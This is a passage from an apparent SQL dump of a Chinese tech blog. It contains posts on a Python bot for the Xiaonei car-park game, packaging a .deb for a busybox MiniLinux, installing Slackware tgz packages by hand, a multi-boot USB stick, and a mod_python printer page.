l(\'\\\"id\\\"\\:(.*)\\}\',ret)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(pids)&gt;0:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.pid=pids[0]&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print ret.encode(\'utf-8\')&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'获取好友列表&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def listFriends(self):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://carpark.xiaonei.com/getFriendsCarList.do\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.friends=json.read(self.req(url))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'获取某个好友信息&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def showFriend(self,fid):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://carpark.xiaonei.com/ajax_car_park_get_next_page.f?pid=%s\' % fid&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'获取个人汽车列表&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def getMyCar(self):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://carpark.xiaonei.com/ajaxGetMyCar.f\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.mycar=json.read(self.req(url))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'贴条&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def harvest(self,pid):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://carpark.xiaonei.com/ajax_car_park_remove_car.do\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={\'pid\':pid}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'停车 把car听到friend的第pid个停车场&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def stopCar(self,car,friend,pid):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=\'http://carpark.xiaonei.com/ajaxAddCar.do\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body = {\'carId\':car[\'car_id\'],\'carName\':car[\'car_name\'].encode(\'utf-8\'),\'free\':0,&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'onlyCarId\':car[\'uc_id\'],\'ownerId\':self.pid,&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'parkIdFrom\':0,\'parkIdTo\':pid,&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'parkOwnerIdFrom\':car[\'user_id\'], \'parkOwnerIdTo\':friend[\'userid\'],&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'parkOwnerNameFrom\': car[\'user_name\'].encode(\'utf-8\'),&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'parkOwnerNameTo\': friend[\'user_name\'].encode(\'utf-8\')}&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=self.req(url,body)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if raw==\'timeNotEnough\':&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return raw&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return True&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'自动寻找空车位并停车&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def findAndStop(self,car):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for friend in self.friends[\'friends\']:#对每个好友&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#如果停车场满或者同一个好友的不同停车场，不能停&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if friend[\'full\'] == \'f\' or friend[\'userid\'] == car[\'user_id\']:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;fpark=self.showFriend(friend[\'userid\']) #获取该好友详情&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid = -1&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for park in fpark[\'parklist\']:#该好友的每个停车场&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid += 1&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park[\'parked\']==0 and park[\'free\'] == 0:#空闲而且非免费&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.stopCar(car,friend,pid)#停车&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return True&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'查看自己的汽车，&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;如果有空闲的，则找到空闲车位并停放&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 查看自己的停车场&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;如果有可以贴条的，则贴条&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;\'\'\'&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def run(self):&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.getMyCar()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.listFriends()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autoPark: #自动停车&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for mycar in self.mycar[\'carlist\']: #每辆汽车&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if int(mycar[\'money\']) == self.mycar[\'maxGain\']: #钱已经挣满了&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.findAndStop(mycar)==True:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u\'停车%s\'.encode(\'utf-8\') % mycar[\'car_name\']&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autoPaste: #自动贴条&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;myplace = self.showFriend(self.pid)&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid = -1&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for park in myplace[\'parklist\']: #每个停车场&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pid += 1&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park[\'parked\'] == 1:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if park[\'money\'] in [10000,15000,18000] or park[\'money\'] &gt; 18000:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u\'%d贴条%s\'.encode(\'utf-8\') % (pid,park[\'name\'])&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.harvest(pid)if __name__==\'__main__\':&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park = Park()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.login(\'校内账号\',\'校内密码\')&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.listFriends()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.getMyCar()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;park.run()&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u\'下次运行60分钟后\'.encode(\'utf-8\')&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;time.sleep(60*60)','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(321,'为MiniLinux编写deb软件包','33731937200932791454322',2,'2009-04-27 09:14:54',NULL,'2009-04-27 09:14:54','2014-07-13 18:57:24','软用Linux2.6.21内核和1.5.1的busybox制作的minilinux, 支持dpkg命令, 这样就可以在Ubuntu下开发deb包, 然后部署到MiniLinux上<br />1. 在Ubuntu上开发hello.deb(只要记住checkinstall就可以了)<br />编写代码并编译<br />vi test.c<br />#include &lt;stdio.h&gt;<br />int main(){<br />&nbsp;&nbsp;&nbsp; printf(\"Hello, Worlp\\n\");<br />&nbsp;&nbsp;&nbsp; return 0;<br />}<br />编译, 因为MiniLinux用的是busybox,没有连接库, 所以要用gcc的-static选项静态链接,  <br />gcc -static test.c -o hello<br />制作安装包:<br />sudo apt-get install checkinstall<br />sudo checkinstall<br />报错说找不到make install, 恩, 很明显是checkinstall需要Makefile, 写一个<br />vi Makefile<br />install:<br />&nbsp;&nbsp;&nbsp; cp hello /bin/hello<br />sudo checkinstall<br />全部默认即可, 当前目录下就会生成hello_2009xxxx_i386.deb<br /><br />2. 拷贝到MiniLinux上,<br />首先将包放到Ubuntu的web目录下, cp hello_2009xxxx_i386.deb ~/public_html/hello.deb<br />然后从MiniLinux上下载 wget http://192.201.0.66/~hank/hello.deb<br />然后安装dpkg -i hello.deb<br />dpkg -i hello.deb<br />提示dpkg: /var/lib/dpkg/status No such file or directory<br />看来dpkg需要这些文件和文件夹目录<br />mkdir -p /var/lib/dpkg<br />touch /var/lib/dpkg/status<br />继续安装dpkg -i&nbsp; hello.deb<br />提示dpkg: /var/lib/dpkg/info/hello.conffiles No such file or directory<br />继续创建文件 mkdir /var/lib/dpkg/info<br />dpkg -i hello.deb<br />安装成功, 测试<br />$ hello<br />hello, worlp<br />$ dpkg -l<br /><br />Tips:<br />可以在bin目录下创建一个脚本, 下次调用wget时就不用那么麻烦了<br />$ vi /bin/wgeth<br />#/bin/sh<br />wget http://192.201.0.111/~hank/$1<br />$ chmod +x /bin/wgeth<br />$ wgeth hello.deb<br />',1,1,1,0,0,0,'软用Linux2.6.21内核和1.5.1的busybox制作的minilinux, 支持dpkg命令, 这样就可以在Ubuntu下开发deb包, 然后部署到MiniLinux上1. 在Ubuntu上开发hello.deb(只要记住checkinstall就可以了)编写代码并编译vi test.c#include &lt;stdio.h&gt;int main(){&nbsp;&nbsp;&nbsp; printf(\"Hello, Worlp\\n\");&nbsp;&nbsp;&nbsp; return 0;}编译, 因为MiniLinux用的是busybox,没有连接库, 所以要用gcc的-static选项静态链接,  gcc -static test.c -o hello制作安装包:sudo apt-get install checkinstallsudo checkinstall报错说找不到make install, 恩, 很明显是checkinstall需要Makefile, 写一个vi Makefileinstall:&nbsp;&nbsp;&nbsp; cp hello /bin/hellosudo checkinstall全部默认即可, 当前目录下就会生成hello_2009xxxx_i386.deb2. 拷贝到MiniLinux上,首先将包放到Ubuntu的web目录下, cp hello_2009xxxx_i386.deb ~/public_html/hello.deb然后从MiniLinux上下载 wget http://192.201.0.66/~hank/hello.deb然后安装dpkg -i hello.debdpkg -i hello.deb提示dpkg: /var/lib/dpkg/status No such file or directory看来dpkg需要这些文件和文件夹目录mkdir -p /var/lib/dpkgtouch /var/lib/dpkg/status继续安装dpkg -i&nbsp; hello.deb提示dpkg: /var/lib/dpkg/info/hello.conffiles No such file or directory继续创建文件 mkdir /var/lib/dpkg/infodpkg -i hello.deb安装成功, 测试$ hellohello, worlp$ dpkg -lTips:可以在bin目录下创建一个脚本, 下次调用wget时就不用那么麻烦了$ vi /bin/wgeth#/bin/shwget http://192.201.0.111/~hank/$1$ chmod +x /bin/wgeth$ wgeth hello.deb','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(322,'Slackware的包管理机制','337319372009421595621',2,'2009-05-21 17:09:05',NULL,'2009-05-21 17:09:05','2014-07-13 18:57:24','Slackwared的包是以tgz结尾的.tar.gz文件，使用命令installpkg xxx.tgz进行安装，installpkg是一个脚本文件<br />里面包含一个install文件夹和对应的usr,bin,sbin,etc之类的文件夹，<br />而install文件夹里的doinstall.sh则包含安装时需要执行的脚本<br /><br />安装完Slackware以后，如果要安装其它的包，有两种方法：<br />1. 挂载光盘或iso镜像，然后进入slackware文件夹的a ap x n等子文件夹，然后执行./install-package脚本，可以选择需要的包进行安装<br />2. 直接把slackware文件夹里的tgz包拷贝出来，然后installpkg xxx.tgz<br /><br />基于以上理解，在其它发行版上安装tgz包时，可以首先尝试把slackware的installpkg拷贝过来，然后使用installpkg安装；如果installpkg不能工作，可以手工安装，例如a.tgz<br />gunzip a.tgz<br />tar xf a.tar -C /<br />cd /install<br />chmod +x doinstlal.sh<br />cd ..<br />./doinstall.sh<br />rm -fr /install<br />',1,1,1,0,0,0,'Slackwared的包是以tgz结尾的.tar.gz文件，使用命令installpkg xxx.tgz进行安装，installpkg是一个脚本文件里面包含一个install文件夹和对应的usr,bin,sbin,etc之类的文件夹，而install文件夹里的doinstall.sh则包含安装时需要执行的脚本安装完Slackware以后，如果要安装其它的包，有两种方法：1. 挂载光盘或iso镜像，然后进入slackware文件夹的a ap x n等子文件夹，然后执行./install-package脚本，可以选择需要的包进行安装2. 直接把slackware文件夹里的tgz包拷贝出来，然后installpkg xxx.tgz基于以上理解，在其它发行版上安装tgz包时，可以首先尝试把slackware的installpkg拷贝过来，然后使用installpkg安装；如果installpkg不能工作，可以手工安装，例如a.tgzgunzip a.tgztar xf a.tar -C /cd /installchmod +x doinstlal.shcd .../doinstall.shrm -fr /install','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(323,'8G U盘做DOS, WinPE, CDLinux, Ubuntu启动盘','337319372009318112713715',2,'2009-04-18 11:27:13',NULL,'2009-04-18 11:27:13','2014-07-13 18:57:24','分三步, 安装Ubuntu; 拷贝DOS,WinPE,CDLinux文件; 配置引导<br />1. 使用虚拟机安装Ubuntu, <br />创建虚拟机的时候, 制定硬盘为物理硬盘<br />分区为两个分区, 第一个主分区5.4G, FAT32, 挂载为/dos; 第二个主分区ext3,挂载为/<br />注意:虚拟机里一定要去掉USB控制器, N次失败的教训.<br />2.安装完Ubuntu后, 关闭虚拟机, 在Windows下把DOS, WinPE, CDLinux文件拷贝到5G的FAT32分区中<br />3.在Ubuntu的/boot/grub/menu.lst中增加一项<br />title DOS,WinPE,CDLinux<br />root (hd0,0)<br />kernel /boot/grub/memdisk.gz<br />initrd /boot/grub/win99.zip<br /><br /><a href=\"http://63.dc.ftn.qq.com/ftn_handler/b862de048cda3f97e70d03a38da38d40b4edcf1a4bab62151fa72bb02723efc51e0ca5dc50f96dd441f46b66e4d8fc7a4ed8f83d7f764cde5eb2d2f006de2613/U3.rar?k=5830653876f5be8e8bf256284531544d5204045a515304014f540609551c5204530848015a07504f54095208025551030053525a63376637511e17591131\" rel=\"nofollow\" target=\"_blank\">DOS, WinPE, CDLinux压缩文件下载</a>, <span>提取码 b0e8c1fb</span><br /><br />',1,1,1,0,0,0,'分三步, 安装Ubuntu; 拷贝DOS,WinPE,CDLinux文件; 配置引导1. 使用虚拟机安装Ubuntu, 创建虚拟机的时候, 制定硬盘为物理硬盘分区为两个分区, 第一个主分区5.4G, FAT32, 挂载为/dos; 第二个主分区ext3,挂载为/注意:虚拟机里一定要去掉USB控制器, N次失败的教训.2.安装完Ubuntu后, 关闭虚拟机, 在Windows下把DOS, WinPE, CDLinux文件拷贝到5G的FAT32分区中3.在Ubuntu的/boot/grub/menu.lst中增加一项title DOS,WinPE,CDLinuxroot (hd0,0)kernel /boot/grub/memdisk.gzinitrd /boot/grub/win99.zipDOS, WinPE, CDLinux压缩文件下载, 提取码 b0e8c1fb','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(324,'Fw：mod_python的req对象详解','33731937201002211200164',2,'2010-01-22 11:20:00',NULL,'2010-01-22 11:20:00','2014-07-13 18:57:24','<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\"><font face=\"宋体\">简易的网页，使用mod_python比django要方便的多，比如一个打印机管理页面，因此用到一此req的属性，如下：</font><br /></p><p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">主要是设置req.content_type=\"text/html\", 以及禁用缓存 req.no_cache=True<br /></p><p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\"><font face=\"宋体\"><br />#encoding: utf-8<br />from mod_python import apache<br />import os,re<br /><br />page=\'\'\'<br />&lt;head&gt;<br />&lt;META HTTP-EQUIV=\"Pragma\" CONTENT=\"no-cache\"&gt;<br />&lt;META HTTP-EQUIV=\"Cache-Control\" CONTENT=\"no-cache\"&gt;<br />&lt;META HTTP-EQUIV=\"Expires\" CONTENT=\"0\"&gt;<br /><br />&lt;title&gt;打印机管理&lt;/title&gt;<br />&lt;script src=\"/js/jquery.js\"&gt;&lt;/script&gt;<br />&lt;script type=\"text/javascript\"&gt;<br />function clsJob(){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $.get(\'/index.py/?clear\',function(data){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(data==\'\'){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(\"#jobs\").html(\'队列中没有作业\');<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(\"打印队列已清空\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(data);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });<br />}<br />function openPr(){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $.get(\'/index.py/?open\',function(data){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(data==\'already\'){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(\'打印机已经打开\');<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(data==\'succeed\' || data==\'already\'){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $(\'#status\').html(\'&lt;font color=\"green\"&gt;正常&lt;/font&gt;\');<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br 